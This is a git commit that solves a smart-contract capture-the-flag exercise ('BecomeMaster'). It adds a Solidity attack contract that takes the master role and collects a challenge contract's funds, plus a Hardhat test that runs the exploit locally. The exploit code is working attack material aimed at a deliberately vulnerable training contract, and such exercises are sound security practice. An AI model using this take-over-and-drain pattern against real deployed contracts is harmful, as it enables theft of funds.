8c662c45ae1c03cd567dc3123e837d20d29ae360
Juan Xavier Valverde <juanxaviervm@hotmail.com>
2022-07-19 17:26:56 -0500

    N5 done

--- contracts/hacks/N5-BecomeMasterhack.sol
+++ contracts/hacks/N5-BecomeMasterhack.sol
@@ -4,11 +4,22 @@ pragma solidity 0.8.11;
 import "../N5-BecomeMaster-medium.sol";
 
 contract N5ExploitHack {
-    constructor(N5BecomeMaster instance) payable {
-    // Complete with your own code
+    N5BecomeMaster public immutable victim;
+    address immutable _owner;
+
+    receive() external payable {}
+
+    constructor(address _N5) {
+        victim = N5BecomeMaster(_N5);
+        _owner = msg.sender;
+        victim.allocate();
+        victim.takeMasterRole();
+        victim.collectAllocations();
     }
 
-    function finalize() external {
-        // can be used to finalize the exploit patten
+    function withdraw() external {
+        require(msg.sender == _owner);
+        (bool success, ) = _owner.call{value: address(this).balance}("");
+        require(success);
     }
 }
--- test/N5-BecomeMaster-medium.js
+++ test/N5-BecomeMaster-medium.js
@@ -1,19 +1,31 @@
-const { expect } = require('chai');
+const { expect } = require('chai')
+const { ethers } = require('hardhat')
 
 // run the test
 // npx hardhat test ./test/N5-BecomeMaster-medium.js
 describe('CTF #5 BecomeMaster', function () {
-    before(async function () {
-    [deployer] = await ethers.getSigners();
+  before(async function () {
+    ;[deployer, attacker] = await ethers.getSigners()
 
-    const Challenge = await ethers.getContractFactory('N5BecomeMaster');
-    challengeInstance = await Challenge.deploy({ value: ethers.utils.parseEther('0.0001') });
-    await challengeInstance.deployed();
-  });
+    const Challenge = await ethers.getContractFactory('N5BecomeMaster')
+    challengeInstance = await Challenge.deploy({ value: ethers.utils.parseEther('0.0001') })
+    await challengeInstance.deployed()
+  })
 
   it('Should recover all funds', async function () {
     // Your code goes here
 
-    expect(await ethers.provider.getBalance(challengeInstance.address)).to.equal('0');
-  });
-});
+    // Deploy evil contract. Attack happens in constructor.
+    const N5ExploitHack = await ethers.getContractFactory('N5ExploitHack')
+    attackerContract = await N5ExploitHack.connect(attacker).deploy(challengeInstance.address)
+
+    // Withdraw funds
+    await attackerContract.connect(attacker).withdraw()
+
+    console.log(await challengeInstance.admin())
+    console.log(await challengeInstance.master())
+    console.log(attacker.address)
+
+    expect(await ethers.provider.getBalance(challengeInstance.address)).to.equal('0')
+  })
+})
